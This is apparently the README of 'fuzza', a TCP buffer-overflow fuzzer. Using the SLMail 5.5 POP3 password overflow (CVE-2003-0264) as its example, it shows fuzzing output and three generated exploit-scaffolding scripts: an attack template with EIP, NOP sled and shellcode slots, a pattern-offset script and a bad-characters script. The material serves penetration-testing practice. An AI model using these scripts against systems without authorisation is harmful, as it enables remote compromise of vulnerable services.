# fuzza

[![](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![PyPI](https://img.shields.io/pypi/v/fuzza)](https://pypi.org/project/fuzza/)
[![PyPI - Status](https://img.shields.io/pypi/status/fuzza)](https://pypi.org/project/fuzza/)
[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/fuzza)](https://pypi.org/project/fuzza/)
[![PyPI - Format](https://img.shields.io/pypi/format/fuzza)](https://pypi.org/project/fuzza/)
[![PyPI - Implementation](https://img.shields.io/pypi/implementation/fuzza)](https://pypi.org/project/fuzza/)
[![PyPI - License](https://img.shields.io/pypi/l/fuzza)](https://pypi.org/project/fuzza/)

[![Build Status](https://github.com/cytopia/fuzza/workflows/linting/badge.svg)](https://github.com/cytopia/fuzza/actions?workflow=linting)

Customizable TCP fuzzing tool to test for remote buffer overflows.

`fuzza` is able to send and receive any initial commands prior sending the payload as well as
sending any post commands after the payload has been sent. In order to replicate and triage the
buffer overflow, `fuzza` can be used to generate custom python scripts for attack, badchars and
finding the eip based on your command line arguments. See examples for more details.


## Installation
```bash
pip install fuzza
```


## Usage
```bash
$ fuzza --help

usage: fuzza [-h] [-v] [-c char] [-p str] [-s str] [-l int] [-m int] [-i str]
             [-e str] [-t float] [-d float] [-g dir]
             host port

Customizable TCP fuzzing tool to test for remote buffer overflows.

positional arguments:
  host                  address to connect to.
  port                  port to connect to.

optional arguments:
  -h, --help            show this help message and exit
  -v, --version         Show version information,
  -c char, --char char  Buffer character to send as payload. Default: "A"
  -p str, --prefix str  Prefix string to prepend to buffer. Empty by default.
  -s str, --suffix str  Suffix string to append to buffer. Empty by default.
  -l int, --length int  Initial length to concat buffer string with x*char.
                        When using the '-g' option to generate reproducible attack scripts set this to the
                        value at which the crash occured in order to pre-populate the generated scripts.
                        Default: 100
  -m int, --multiply int
                        Round multiplier to concat buffer string with x*char every round. Default: 100
  -i str, --init str    If specified, initializes communication before sending the payload in the form
                        '<send>:<expect>,<send>:<expect>,...'. Where <send> is the data to be sent
                        to the server and <expect> is the answer to be received from the server.
                        Either one of <send> or <expect> can be omitted if you expect something without
                        having sent data yet or need to send something for which there will not be an
                        answer. Multiple <send>:<expect> are supported and must be separated by a comma.
                        Regex supported for <expect> part.
  -e str, --exit str    If specified, finalizes communication after sending the payload in the form
                        '<send>:<expect>,<send>:<expect>,...'. Where <send> is the data to be sent
                        to the server and <expect> is the answer to be received from the server.
                        Either one of <send> or <expect> can be omitted if you expect something without
                        having sent data yet or need to send something for which there will not be an
                        answer. Multiple <send>:<expect> are supported and must be separated by a comma.
                        Regex supported for <expect> part.
  -t float, --timeout float
                        Timeout in seconds for receiving data before declaring
                        the endpoint as crashed. Default: 30.0
  -d float, --delay float
                        Delay in seconds between each round. Default: 1.0
  -g dir, --generate dir
                        Generate custom python scripts based on your command line arguments
                        to reproduce and triage the overflow. Requires a directory to be specified where to
                        save the scripts to.

example:

  The following example illustrates how to use the initial communication by:
      1. Expecting the POP3 server banner
      2. Sending 'USER bob'
      3. Expecting a welcome message
  Additionally before sending the fuzzing characters, it is prepended with 'PASS ',
  so that the actuall fuzzing can be done on the password:
     1. Prefix payload with 'PASS '
     2. Send payload
  Lastly in order to also close the connection the '-e' opton is used
  (which works exactly as '-i') in order to send data after the payload.
     1. Expect any response from password payload
     2. Terminate the connection via QUIT
     3. Do not expect a follow up response

     $ fuzza -i ':.*POP3.*,USER bob:.*welcome.*' -e ':.*,QUIT:' -p 'PASS '
```


## Examples

### SLMail 5.5 Buffer overflow

#### Overview

* [CVE-2003-0264](https://www.cvedetails.com/cve/CVE-2003-0264/) - buffer overflow in password.

To see how the raw communication works, have a look at the following netcat snippet:
```bash
$ nc mail.example.tld 110
+OK POP3 server mail.example.tld ready <00001.544405549@mail.example.tld>
USER test
+OK test welcome here
PASS LongPassword
-ERR unable to lock mailbox
QUIT
```

#### Find potential overflow length

In order to fuzz the password, all previous communication must have happened. By using `fuzza`,
this can be achieved with the `-i` argument to specify initial data to be send and received.
Additionally we also want to close the connection after sending the payload (if possible).
This can be achieved with the `-e` option which works exactly as `-i`.
```bash
$ fuzza -i ':.*OK POP3.*,USER test:.*test welcome.*' -p 'PASS ' -e ':.*,QUIT:' mail.example.tld 110

------------------------------------------------------------
A * 100
------------------------------------------------------------
Init Awaiting: .*OK POP3.*
Init Received: +OK POP3 server mail.example.tld ready <00005.544236132@mail.example.tld>
Init Sending:  USER test
Init Awaiting: test welcome
Init Received: +OK test welcome here
Sending "PASS " + "A"*100 + ""
Exit Awaiting: .*
Exit Received: -ERR unable to lock mailbox
Exit Sending:  QUIT
...

------------------------------------------------------------
A * 2700
------------------------------------------------------------
Init Awaiting: .*POP3.*
Init Received: +OK POP3 server mail.example.tld ready <00009.592913389@mail.example.tld>
Init Sending:  USER test
Init Awaiting: welcome here
Init Received: +OK test welcome here
Sending "PASS " + "A"*2700 + ""
Exit Awaiting: .*

Remote service (most likely) crashed at 2700 bytes of "A"
Payload sent:
PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

#### Generate triaging scripts

Now that you know the application is potentially vulnerable at or before 2700 bytes, you will have
to try to replicate and triage the buffer overflow. In order to do so, you can use `fuzza` to
automatically generate triaging scripts based on your current arguments and findings.

Use the same arguments as before, add the initial length of 2700 bytes (`-l 2700`) and specify
an output directory (`-g <path>`):
```bash
$ fuzza -i ':.*OK POP3.*,USER test:.*test welcome.*' -p 'PASS ' -e ':.*,QUIT:' -l 2700 -g out/ mail.example.tld 110
```
`fuzza` will then generate three files in `out/` directory based on your command line arguments:

1. `attack.py`  - used to replicate and triage buffer overflow
2. `pattern.py` - used to find offset for EIP
3. `badchars.py` - used to find any bad characters for the exploit shellcode

Based on the above specified command line arguments, the triaging scripts will look as follows:

**`attack.py`**
```python
#!/usr/bin/env python
"""fuzza autogenerated."""

from __future__ import print_function
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

len_total    = 2700               # Start at len_overflow and try out how much can be overwritten
len_overflow = 2670               # Use pattern_create.rb and pattern_offset.rb to find exact offset
len_nop_sled = 16                 # Add nops if you need to encode your shellcode
eip          = "\x90\x90\x90\x90" # Change this (Keep in mind to put address in reverse order)
shellcode    = ""

padding = "C"*(len_total - len_overflow - len(str(eip)) - len_nop_sled - len(shellcode))
buffer  = "A"*len_overflow + eip + "\x90"*len_nop_sled + shellcode + padding

try:
    print('Sending buffer...')
    s.connect(('mail.example.tld', 110))
    s.recv(1024)
    s.send('USER test' + '\r\n')
    s.recv(1024)
    s.send('PASS ' + buffer + '' + '\r\n')
    s.recv(1024)
    s.send('QUIT' + '\r\n')
    print('done')
except:
    print('Could not connect')
```
**`pattern.py`**
```python
#!/usr/bin/env python
"""fuzza autogenerated."""

from __future__ import print_function
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

pattern = ""     # Add output from pattern_create.rb

try:
    print('Sending buffer...')
    s.connect(('mail.example.tld', 110))
    s.recv(1024)
    s.send('USER test' + '\r\n')
    s.recv(1024)
    s.send('PASS ' + pattern + '' + '\r\n')
    s.recv(1024)
    s.send('QUIT' + '\r\n')
    print('done')
except:
    print('Could not connect')
```
**`badchars.py`**
```python
#!/usr/bin/env python
"""fuzza autogenerated."""

from __future__ import print_function
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

len_total    = 2700      # Start at len_overflow and try out how much can be overwritten
len_overflow = 2670      # Use pattern_create.rb and pattern_offset.rb to find exact offset
eip          = "B"*4     # Ignore for badchar detection
badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

buffer = "A"*len_overflow + eip + badchars

try:
    print('Sending buffer...')
    s.connect(('mail.example.tld', 110))
    s.recv(1024)
    s.send('USER test' + '\r\n')
    s.recv(1024)
    s.send('PASS ' + buffer + '' + '\r\n')
    s.recv(1024)
    s.send('QUIT' + '\r\n')
    print('done')
except:
    print('Could not connect')
```


## License

**[MIT License](LICENSE.txt)**

Copyright (c) 2020 **[cytopia](https://github.com/cytopia)**
